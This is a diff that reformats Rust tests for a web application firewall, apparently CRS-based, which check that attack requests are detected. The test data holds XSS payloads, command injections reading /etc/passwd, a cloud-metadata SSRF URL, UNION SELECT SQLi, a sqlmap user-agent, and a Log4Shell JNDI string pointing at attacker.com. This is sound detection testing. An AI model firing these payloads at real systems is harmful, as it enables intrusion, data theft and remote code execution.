@@ -120,9 +120,7 @@ mod xss {
     #[test]
     fn script_tag_injection() {
         let eng = engine();
-        let mut ctx = make_get_ctx(
-            "http://example.com/?q=%3Cscript%3Ealert(1)%3C/script%3E",
-        );
+        let mut ctx = make_get_ctx("http://example.com/?q=%3Cscript%3Ealert(1)%3C/script%3E");
         set_paranoia(&mut ctx, 2);
         eval(&eng, &mut ctx, Phase::RequestBody);
         assert_score(&ctx, 5, "<script> tag should trigger XSS rules");
@@ -131,9 +129,8 @@ mod xss {
     #[test]
     fn img_onerror_xss() {
         let eng = engine();
-        let mut ctx = make_get_ctx(
-            "http://example.com/?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
-        );
+        let mut ctx =
+            make_get_ctx("http://example.com/?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E");
         set_paranoia(&mut ctx, 2);
         eval(&eng, &mut ctx, Phase::RequestBody);
         assert_score(&ctx, 5, "onerror XSS should trigger");
@@ -151,9 +148,7 @@ mod xss {
     #[test]
     fn svg_onload_xss() {
         let eng = engine();
-        let mut ctx = make_get_ctx(
-            "http://example.com/?q=%3Csvg%20onload%3Dalert(1)%3E",
-        );
+        let mut ctx = make_get_ctx("http://example.com/?q=%3Csvg%20onload%3Dalert(1)%3E");
         set_paranoia(&mut ctx, 2);
         eval(&eng, &mut ctx, Phase::RequestBody);
         assert_score(&ctx, 5, "SVG onload XSS should trigger");
@@ -242,9 +237,7 @@ mod rce {
     #[test]
     fn semicolon_command_injection() {
         let eng = engine();
-        let mut ctx = make_get_ctx(
-            "http://example.com/?cmd=ls%20-la%3Bcat%20/etc/passwd",
-        );
+        let mut ctx = make_get_ctx("http://example.com/?cmd=ls%20-la%3Bcat%20/etc/passwd");
         set_paranoia(&mut ctx, 2);
         eval(&eng, &mut ctx, Phase::RequestBody);
         assert_score(&ctx, 5, "semicolon command injection should trigger");
@@ -271,9 +264,7 @@ mod rce {
     #[test]
     fn dollar_subshell_injection() {
         let eng = engine();
-        let mut ctx = make_get_ctx(
-            "http://example.com/?cmd=%24(cat%20/etc/passwd)",
-        );
+        let mut ctx = make_get_ctx("http://example.com/?cmd=%24(cat%20/etc/passwd)");
         set_paranoia(&mut ctx, 2);
         eval(&eng, &mut ctx, Phase::RequestBody);
         assert_score(&ctx, 5, "$() subshell injection should trigger");
@@ -347,9 +338,8 @@ mod protocol_attack {
     #[test]
     fn ssrf_metadata_access() {
         let eng = engine();
-        let mut ctx = make_get_ctx(
-            "http://example.com/?url=http://169.254.169.254/latest/meta-data/",
-        );
+        let mut ctx =
+            make_get_ctx("http://example.com/?url=http://169.254.169.254/latest/meta-data/");
         set_paranoia(&mut ctx, 2);
         eval(&eng, &mut ctx, Phase::RequestBody);
         assert_score(&ctx, 5, "AWS metadata SSRF should trigger");
@@ -389,11 +379,17 @@ mod scanner_detection {
     fn sqlmap_user_agent_detected() {
         let eng = engine();
         let mut ctx = make_get_ctx("http://example.com/");
-        ctx.request_headers
-            .insert(http::header::USER_AGENT, "sqlmap/1.7#stable".parse().unwrap());
+        ctx.request_headers.insert(
+            http::header::USER_AGENT,
+            "sqlmap/1.7#stable".parse().unwrap(),
+        );
         set_paranoia(&mut ctx, 2);
         eval(&eng, &mut ctx, Phase::RequestBody);
-        assert_score(&ctx, 5, "sqlmap User-Agent should trigger scanner detection");
+        assert_score(
+            &ctx,
+            5,
+            "sqlmap User-Agent should trigger scanner detection",
+        );
     }
 
     #[test]
@@ -413,7 +409,9 @@ mod scanner_detection {
         let mut ctx = make_get_ctx("http://example.com/");
         ctx.request_headers.insert(
             http::header::USER_AGENT,
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/125.0".parse().unwrap(),
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/125.0"
+                .parse()
+                .unwrap(),
         );
         set_paranoia(&mut ctx, 2);
         eval(&eng, &mut ctx, Phase::RequestBody);
@@ -435,9 +433,7 @@ mod java_attacks {
     #[test]
     fn log4shell_jndi_injection() {
         let eng = engine();
-        let mut ctx = make_get_ctx(
-            "http://example.com/?q=%24%7Bjndi:ldap://attacker.com/a%7D",
-        );
+        let mut ctx = make_get_ctx("http://example.com/?q=%24%7Bjndi:ldap://attacker.com/a%7D");
         set_paranoia(&mut ctx, 2);
         eval(&eng, &mut ctx, Phase::RequestBody);
         assert_score(&ctx, 5, "Log4Shell JNDI injection should trigger");
@@ -520,9 +516,8 @@ mod cross_category {
     #[test]
     fn full_crs_sqli_detected() {
         let eng = full_engine();
-        let mut ctx = make_get_ctx(
-            "http://example.com/?id=1%27%20UNION%20SELECT%20*%20FROM%20users--",
-        );
+        let mut ctx =
+            make_get_ctx("http://example.com/?id=1%27%20UNION%20SELECT%20*%20FROM%20users--");
         set_paranoia(&mut ctx, 2);
         eval(&eng, &mut ctx, Phase::RequestBody);
         assert_score(&ctx, 5, "full CRS should detect UNION SELECT SQLi");
@@ -531,9 +526,8 @@ mod cross_category {
     #[test]
     fn full_crs_xss_detected() {
         let eng = full_engine();
-        let mut ctx = make_get_ctx(
-            "http://example.com/?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E",
-        );
+        let mut ctx =
+            make_get_ctx("http://example.com/?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E");
         set_paranoia(&mut ctx, 2);
         eval(&eng, &mut ctx, Phase::RequestBody);
         assert_score(&ctx, 5, "full CRS should detect script XSS");
@@ -585,8 +579,10 @@ mod cross_category {
     fn sqlmap_ua_with_full_crs_detected() {
         let eng = full_engine();
         let mut ctx = make_get_ctx("http://example.com/");
-        ctx.request_headers
-            .insert(http::header::USER_AGENT, "sqlmap/1.7#stable".parse().unwrap());
+        ctx.request_headers.insert(
+            http::header::USER_AGENT,
+            "sqlmap/1.7#stable".parse().unwrap(),
+        );
         set_paranoia(&mut ctx, 2);
         eval(&eng, &mut ctx, Phase::RequestBody);
         assert_score(&ctx, 5, "full CRS should detect sqlmap UA");
@@ -598,7 +594,9 @@ mod cross_category {
         let mut ctx = make_get_ctx("http://example.com/");
         ctx.request_headers.insert(
             http::header::USER_AGENT,
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/125.0".parse().unwrap(),
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/125.0"
+                .parse()
+                .unwrap(),
         );
         set_paranoia(&mut ctx, 2);
         eval(&eng, &mut ctx, Phase::RequestBody);
